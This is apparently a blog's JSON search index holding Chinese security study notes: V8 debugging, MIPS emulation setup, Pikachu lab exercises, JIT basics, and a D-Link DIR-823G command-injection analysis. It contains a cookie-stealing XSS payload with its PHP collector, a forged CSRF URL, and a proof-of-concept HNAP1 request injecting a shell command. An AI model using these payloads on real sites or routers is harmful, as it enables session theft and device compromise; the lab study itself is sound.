//此命令用来解析某连续地址的函数名。","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"V8漏洞初学习","slug":"V8漏洞初学习","date":"2022-08-09T03:17:04.132Z","updated":"2022-08-09T03:49:51.822Z","comments":true,"path":"2022/08/09/V8漏洞初学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的 v8编译后二进制名称叫d8. allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser/x64.release$ ./d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)d8&gt; var a = [1, 2, 3];undefinedd8&gt; %DebugPrint(a);0x2ebcfb54dd41 &lt;JSArray[3]&gt;[1, 2, 3]d8&gt; %SystemBreak();Trace/breakpoint trap (core dumped) 在加载d8时加入此选项可以在js中调试本地运行时函数： %DebugPrint(obj) 输出对象地址%SystemBreak() 触发调试中断主要结合gdb等调试器使用 gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本： source /path/to/gdbinit_v8 下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js： 123456789var a = [1,2,3];var b = [1.1, 2.2, 3.3];var c = [a, b];%DebugPrint(a);%SystemBreak(); //触发第一次调试%DebugPrint(b);%SystemBreak(); //触发第二次调试%DebugPrint(c);%SystemBreak(); //触发第三次调试 gdb运行d8: 123456789root@kali:~/ctf/browser/x64.release$ gdb ./d8pwndbg&gt; set args --allow-natives-syntax ./test.jspwndbg&gt; rStarting program: x64.release/d8 --allow-natives-syntax ./test.js[Thread debugging using libthread_db enabled][New Thread 0x7ff87fde9700 (LWP 18393)][New Thread 0x7ff87f5e8700 (LWP 18394)][New Thread 0x7ff87ede7700 (LWP 18395)]0x12e891f8df11 &lt;JSArray[3]&gt; 可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。 此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。 v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。 telescope命令查看内存数据。 在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58. v8的对象结构和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。 首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。 为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。 但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码add eax,ebx，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。 一个对象在内存中布局大致如下： map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型 prototype：prototype elements:对象元素 length:元素个数 properties:属性 数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图： 由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。 上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。 浏览器V8的解题步骤一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。 参考https://www.codercto.com/a/81538.html 后续需要实践做一下这个ctf题目。","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"}]},{"title":"Ubuntu下buildroot以及qemu环境搭建","slug":"Ubuntu下buildroot以及qemu环境搭建","date":"2022-08-09T03:17:04.125Z","updated":"2022-08-09T03:48:44.635Z","comments":true,"path":"2022/08/09/Ubuntu下buildroot以及qemu环境搭建/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"0x00 搭建环境windows 10VMwareWorkstation proUbuntu 16.04 x64 0x01 安装binwalk12345678sudo susudo apt-get remove binwalksudo spt-get updatesudo apt-get install build-essential autoconf git //获取Gitgit clone https://github.com/devttys0/binwalkcd binwalksudo python setup.py installsudo ./deps.sh 0x02 安装buildroot交叉编译环境安装依赖： sudo apt-get install libncurses5-dev patch 下载buildroot: wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz 1234tar -zxvf buildroot-2020.02.6.tar.gzcd buildroot-2020.02.6make cleanmake menuconfig 出现配置界面： 选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序 在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。 保存退出 sudo make 静等完成。 os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。 测试： 12./mipsel-linux-gcc hello.c -o hello./hello //失败 使用file查看，是小端序的mips程序。 0x03 qemu运行环境12sudo apt-get install qemusudo apt-get install qemu-user-static 测试hello报错/lib/ld-uClibc.so.0: No such file or directory 是因为没有对应架构的链接库的问题在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下， 123sudo cp ld-uClibc-1.0.32.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.31.sosudo ln -s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0 还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。 出现新报错：/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0' 解决方案： 123sudo cp libuClibc-1.0.31.so /lib/sudo chown -R root:root /lib/libuClibc-1.0.32.sosudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0 还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。 运行成功。 os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。 0x04 配置网络环境","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"}]},{"title":"pikachu漏洞练习记录1","slug":"pikachu漏洞练习1","date":"2022-08-09T03:17:04.119Z","updated":"2022-08-09T03:42:57.758Z","comments":true,"path":"2022/08/09/pikachu漏洞练习1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/","excerpt":"","text":"0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin/123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。 查看源码，输入的验证码在本地验证： 可以在bp上不输入验证码或输入错误验证码都可以爆破。 token防爆破？ token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。 基于token的身份验证 客户端使用用户名和密码请求登录 服务端收到请求去验证用户名和密码 验证成功后，服务端会签发一个token，再将token发送给客户端 客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。 客户端每次向服务端请求资源的时候需要带着服务端签发的token 服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。 app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app 提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。 在测试器中，设置password和token两个变量，使用pitchfork。 点击选项，更改请求引擎中线程数为1，重定向选择总是 Grep-Extract选择添加，中间获得回应包，选择token的值复制并选定，点击OK. 回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。 开始攻击，根据不同length找出正确密码，爆破完成。 注：该方法着实鸡肋。 0x02 XSS(跨站脚本)XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。 输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。 反射性xss(get)随意输入字符串，回显who is xxx,i don’t caref12查看，允许输入最大长度为20. 更改一下可输入长度，输入一个简单的xss语句：&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 发现可以解析，即存在xss漏洞。 观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。 如果是post型xss，无法直接使用url的方式进行攻击。 利用需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。 12345&lt;?php$cookie=$_GET['cookie']; #fp=$fopen(\"cookie.txt\",\"a\");fwirte($fp,\"Cookie:\".$cookie.\"/n\")?&gt; 构造一个xss攻击的js代码 &lt;script&gt;window.open(\"http://127.0.0.1/getcookie.php?cookie=\"+document.cookie);&lt;/script&gt; 新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值…… 反射型xss(post)post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。 可以通过html页面方式提交，构造一个自己的post丢到自己的网站上 随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。 http中get和post的基本区别：get方式在客户端通过url提交数据，数据在url中可以看到；Post方式，数据放置在html header内提交，数据在url中看不到。get只能传输比较少的数据，安全性较低，post传输数据较多。 我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。 存储型xss存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。存储型xss又称永久型xss。 1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。 2.注入&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。 DOM型xssDOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。 0x03 CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。 如何确认一个web系统存在csrf漏洞 1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造 修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造； 对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造； 2.确认凭证的有效期 虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。 CSRF(get)登录账号，抓取修改个人信息流量包。 发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。 可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可): http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit 诱使登录状态的用户点击url就可以完成CSRF攻击。 CSRF(post)如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。 步骤同get。但不知为何时灵时不灵。 正常登录状态： 点击恶意url后，用户信息直接被修改。 CSRF(Token)token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。 如图获取修改信息流量包后发现增加了token，无法利用。 防范CSRF措施 增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样 安全的会话管理（避免会话被利用） 不要再客户端保存敏感信息（身份认证信息） 测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。 访问控制安全管理 敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码） 敏感信息的修改尽量使用post（post安全性高于get） 通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer） 增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/web/"}]},{"title":"JIT学习","slug":"JIT学习","date":"2022-08-09T03:17:04.108Z","updated":"2022-08-09T03:41:19.337Z","comments":true,"path":"2022/08/09/JIT学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JIT原理Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。 还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。 技术点从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。 例子： 12345678 #include&lt;stdio.h&gt;int inc(int a) { return a + 1;}int main() { printf(\"%d\\n\", inc(3)); return 0;} objdump -d 1查看它的机器码。 123456780000000000400526 &lt;inc&gt;: 400526: 55 push %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器 400527: 48 89 e5 mov %rsp,%rbp 40052a: 89 7d fc mov %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3 40052d: 8b 45 fc mov -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中 400530: 83 c0 01 add $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递 400533: 5d pop %rbp 400534: c3 retq 我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可： 1234567891011121314151617181920 #include&lt;stdio.h&gt; #include&lt;memory.h&gt; #include&lt;sys/mman.h&gt;typedef int (* inc_func)(int a); int main() { char code[] = { 0x55, // push rbp 0x48, 0x89, 0xe5, // mov rsp, rbp 0x89, 0xf8, // mov edi, eax 0x83, 0xc0, 0x01, // add $1, eax 0x5d, // pop rbp 0xc3 // ret }; void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, code, sizeof(code)); inc_func p_inc = (inc_func)temp; printf(\"%d\\n\", p_inc(7)); return 0;} mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。 我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。","categories":[],"tags":[{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]},{"title":"Dlink DIR-823G 漏洞挖掘过程","slug":"Dlink-Dir-823G路由器漏洞挖掘过程","date":"2022-08-09T03:17:04.104Z","updated":"2022-08-09T03:39:15.963Z","comments":true,"path":"2022/08/09/Dlink-Dir-823G路由器漏洞挖掘过程/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/","excerpt":"","text":"固件下载地址： https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1 0x01 漏洞介绍D-Link DIR-823G命令注入漏洞： CVE编号：CVE-2019-15529 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 0x02 分析 binwalk -Me 固件.bin //解开固件 是一个squashfs文件系统，标准linux目录结构。 cat /etc/init.d/rcS //查看路由器开启的服务。 发现一个goahead进程。 GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); /goform的请求交给websFormHandler函数处理websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); /cgi-bin的请求交给websCgiHandler函数处理。 模拟运行固件环境使用工具firmware-ayalysis-toolkit。 搭建教程：https://zhuanlan.zhihu.com/p/110806057 运行起来后nmap扫端口，发现开了http服务和dns服务。 访问http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。 在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。 未授权访问/cgi-bin/ExportSettings.sh 导出配置文件，造成信息泄露。 /cgi-bin/upload_settings.cgi 导入配置文件，可导入恶意篡改后的配置。 /cgi-bin/GetDownLoadSyslog.sh 获取系统部分启动信息/var/log/messages* /cgi-bin/upload_firmware.cgi 上传更新固件，可恶意修改固件 goahead 自定义的请求处理函数 处理函数的参数列表：int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t path, char_t query)goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节. IDA打开goahead分析： 通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C. websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。 抓取登录数据包，发现往/HNAP1发送。 分析/HNAP1（0x42383C）处理函数逻辑: 从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。 找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。 此处可以直接注入’来命令执行。 在PHP中常用到以下几个函数来执行外部命令:system system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能 execpassthrushell_exec POC1234567891011POST /HNAP1/ HTTP/1.1Host: 192.168.0.1Content-Length: 53User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: text/xml; charset=UTF-8Accept: */*SOAPAction: \"http://purenetworks.com/HNAP1/Login\"Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"}]},{"title":"Win10下使用Hexo搭建个人博客","slug":"Win10下使用Hexo搭建个人博客","date":"2022-08-07T08:48:45.000Z","updated":"2022-08-09T07:56:51.516Z","comments":true,"path":"2022/08/07/Win10下使用Hexo搭建个人博客/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"下载安装git、nodejs下载地址: git: https://git-scm.com/ nodejs: http://nodejs.cn/download/ 将nodejs加入path环境变量中。打开cmd测试： 报错1：输入 npm-v 出现报错: npm WARN config global --global, --local are deprecated. Use `–location 解决方法：打开nodejs安装位置文件夹，打开npm.cmd和npm，将文件中的prefix -g替换为prefix --location=global,保存后重新打开cmd测试即可。 安装hexo换源（淘宝源）npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm -v 查看版本以及是否安装成功。 安装hexocnpm install -g hexo-cli hexo -v 新建文件夹放置博客内容，在cmd中进入所建立的目录： hexo init #初始化hexo hexo s #启动hexo 访问 http://localhost:4000/如下即成功： 新建文章hexo new \"文章标题\" 在目录/source/_posts/下生成文件.md更新文章： hexo clean hexo g hexo s 部署github1、建立一个新的库，命名需要符合规则：username.gitgub.io2、命令行输入： cnpm install --save hexo-deployer-git 3、更改设置 找到_config.yml文件，翻到最底部 将type改为git 添加repo: \"此处为仓库地址\" 添加branch: master repo为仓库地址 branch为master即可 4、部署到远端 git config --global user.email \"xxx(此处为邮箱)\" git config --global user.name \"xxx(此处为用户名)\" #github用户名 hexo d 弹出网页提示是否关联git和github 授权即可","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pikachu/"},{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"},{"name":"windows漏洞","slug":"windows漏洞","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/"},{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"},{"name":"XSS","slug":"XSS","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/XSS/"},{"name":"chrome","slug":"chrome","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"学习记录","slug":"学习记录","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"},{"name":"RE","slug":"RE","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/RE/"},{"name":"chrome调试","slug":"chrome调试","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/"},{"name":"bp","slug":"bp","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"},{"name":"IOT 《物联网渗透测试》","slug":"IOT-《物联网渗透测试》","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"},{"name":"漏洞","slug":"漏洞","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"web","slug":"web","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/web/"},{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]}